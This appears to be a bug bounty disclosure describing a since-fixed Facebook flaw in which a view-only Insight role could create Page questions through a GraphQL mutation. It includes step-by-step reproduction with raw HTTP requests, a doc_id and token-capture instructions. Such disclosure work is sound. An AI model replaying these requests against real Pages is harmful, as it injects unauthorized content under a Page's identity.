---
title: Page Insight Can Add Questions to Pages
description: A Page member with only 'Insight' role could create Page questions (fun fact prompts) via GraphQL, bypassing required admin/editor privileges.
date: 2025-10-1
categories: [Meta bug bounty]
tags: [Meta]
pin: false
math: true
mermaid: true
---

### 🧾 Description
Normally, only Page Admins or Editors or Moderator can add questions to a Page. However, a user with Page Insight role (intended for view-only access) could leverage Graph API/GraphQL to create new questions on the Page.

**Impact:** View‑only Insight users can post content‑like prompts on the Page, violating least‑privilege and enabling unauthorized content injection under the Page identity.

---

## ⚙️ Steps to Reproduce

**Actors**  
- **UserA** — **Admin** of **PageA**  
- **UserB** — **Insight** role on **PageA**

### 1) Obtain Page access token (as Insight)
1. **UserB** opens Business settings:  
   `https://business.facebook.com/settings/?business_id={ID}`  
2. In DevTools, capture UserB’s business access token, then load Graph API Explorer:  
   `https://developers.facebook.com/tools/explorer`  
3. Query own accounts to fetch a Page token:

#### Request
```http
GET /me?fields=accounts{access_token,name}&access_token={UserB_Token} HTTP/1.1
Host: graph.facebook.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0
Accept: */*
Content-Type: application/x-www-form-urlencoded
Connection: close
```

#### Response 
Returns Page list including PageA with an access_token usable by UserB (Insight).

### 2) Create a new Page question
Using PageA access token in Graph API Explorer:

#### Request
```http
POST /graphql HTTP/1.1
Host: graph.facebook.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0
Accept: */*
Content-Type: application/x-www-form-urlencoded
Connection: close

&doc_id=6994740117216518&variables={"input": {"title": "THE_TITLE","actor_id": "1","client_mutation_id": "1"}}&access_token={PageA_access_token}
```

#### Response
```json
{
  "data": {
    "fun_fact_prompt_create": {
      "viewer": {
        "owned_fun_fact_prompts": {
          "edges": [
            {
              "node": {
                "can_be_answered": true,
                "fun_fact_prompt_title": "THE_TITLE",
                "emoji": "💭",
                "id": "10933509779....",
                "__typename": "FunFactPrompt"
              }
            }
          ]
        }
      }
    }
  }
}
```

### 3) Verify on the Page
UserA visits:  
`https://www.facebook.com/profile.php?id={ID_PAGE}&sk=fun_fact_asked`  
→ New questions appear as if added by authorized roles, even though created by Insight.

---

### 🧱 Expected Behavior
Only Admin/Editor/Moderator roles should be able to create Page questions/prompts. Insight role must be strictly read‑only and not permitted to mutate Page content.

---

## Timeline

- **Reported:** September 19, 2022
- **Triaged:** September 20, 2022
- **Reward:** September 24, 2022
- **Fixed:** October 18, 2022

---
